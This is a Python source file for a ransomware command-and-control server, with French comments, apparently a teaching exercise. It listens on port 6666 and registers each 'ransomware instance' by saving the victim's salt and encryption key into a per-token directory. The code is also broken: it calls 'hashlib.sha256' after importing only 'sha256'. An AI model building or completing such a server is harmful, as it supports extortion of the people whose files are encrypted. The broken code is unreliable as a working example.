import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    #def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        #return {"status":"KO"}


    def post_new(self, path: str, params: dict, body: dict) -> dict:
        # Assurez-vous que le chemin de base existe
        if not os.path.exists(self.ROOT_PATH):
            os.makedirs(self.ROOT_PATH)

        # Récupérer le token depuis les paramètres
        token = params.get('token')

        if token is not None:
            # Créer un répertoire basé sur le hachage (SHA-256) du token
            token_hash = hashlib.sha256(token.encode()).hexdigest()
            dir_path = os.path.join(self.ROOT_PATH, token_hash)

            # Assurez-vous que le répertoire du token existe
            if not os.path.exists(dir_path):
                os.makedirs(dir_path)

            # Stocker le sel et la clé dans des fichiers
            salt = body.get('salt')
            key = body.get('key')

            if salt is not None and key is not None:
                salt_file_path = os.path.join(dir_path, 'salt.bin')
                key_file_path = os.path.join(dir_path, 'key.bin')

                with open(salt_file_path, 'wb') as salt_file:
                    salt_file.write(base64.b64decode(salt))

                with open(key_file_path, 'wb') as key_file:
                    key_file.write(base64.b64decode(key))

                return {'message': f"token {token_hash} enregistré."}
            else:
                return {'error': 'salt et key manquants.'}
        else:
            return {'error': 'Le token manquant .'}
    

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()